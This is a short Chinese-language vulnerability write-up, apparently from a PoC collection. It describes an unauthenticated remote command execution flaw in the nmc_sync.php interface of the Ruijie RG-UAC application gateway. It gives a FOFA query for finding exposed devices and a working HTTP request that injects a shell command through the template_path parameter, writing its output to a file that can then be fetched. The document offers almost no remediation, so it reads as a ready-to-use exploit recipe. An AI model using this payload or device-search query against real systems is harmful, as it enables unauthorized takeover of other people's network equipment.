# 锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞

### 一、漏洞描述
<font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关 nmc_sync.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>

### 二、影响版本
锐捷RG-UAC应用网关

### 三、资产测绘
fofa：app="Ruijie-RG-UAC"

特征：

![1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115.png](./img/iuhRqqHjm3R_IJCE/1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115-825054.png)

### 四、漏洞复现
```plain
GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|whoami%20>dudesuite.txt|cat HTTP/1.1
Host: xxx
Accept-Encoding: gzip
```

![1708679288910-596012c6-d177-41dc-a2b2-8cf937685e25.png](./img/iuhRqqHjm3R_IJCE/1708679288910-596012c6-d177-41dc-a2b2-8cf937685e25-057665.png)

访问：https://xxx/view/systemConfig/management/dudesuite.txt

![1708679132388-d1d1e207-cb68-40d9-8fb6-210f1fd42355.png](./img/iuhRqqHjm3R_IJCE/1708679132388-d1d1e207-cb68-40d9-8fb6-210f1fd42355-882522.png)



> 更新: 2024-06-24 11:42:29  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ex5ms24mq3tyi9wb>